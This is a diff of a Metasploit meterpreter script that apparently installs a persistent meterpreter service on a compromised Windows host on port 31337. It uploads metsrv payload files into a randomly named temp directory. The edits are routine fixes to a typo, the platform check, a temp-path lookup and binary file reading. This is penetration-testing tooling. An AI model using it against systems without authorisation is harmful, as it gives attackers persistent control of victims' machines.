@@ -1,6 +1,6 @@
 ##
 # WARNING: Metasploit no longer maintains or accepts meterpreter scripts.
-# If you'd like to imporve this script, please try to port it as a post
+# If you'd like to improve this script, please try to port it as a post
 # module instead. Thank you.
 ##
 
@@ -42,7 +42,7 @@ rport    = 31337
 install  = false
 autoconn = false
 remove   = false
-if client.platform =~ /win32|win64/
+if client.platform == 'windows'
 
   #
   # Option parsing
@@ -73,7 +73,7 @@ if client.platform =~ /win32|win64/
   # Upload to the filesystem
   #
 
-  tempdir = client.fs.file.expand_path("%TEMP%") + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
+  tempdir = client.sys.config.getenv('TEMP') + "\\" + Rex::Text.rand_text_alpha(rand(8)+8)
 
   print_status("Creating a temporary installation directory #{tempdir}...")
   client.fs.dir.mkdir(tempdir)
@@ -93,7 +93,7 @@ if client.platform =~ /win32|win64/
     print_status(" >> Uploading #{from}...")
     fd = client.fs.file.new(tempdir + "\\" + to, "wb")
     path = (from == 'metsrv.x86.dll') ? MetasploitPayloads.meterpreter_path('metsrv','x86.dll') : File.join(based, from)
-    fd.write(::File.read(path, ::File.size(path)))
+    fd.write(::File.read(path, ::File.size(path), mode: 'rb'))
     fd.close
   end
 
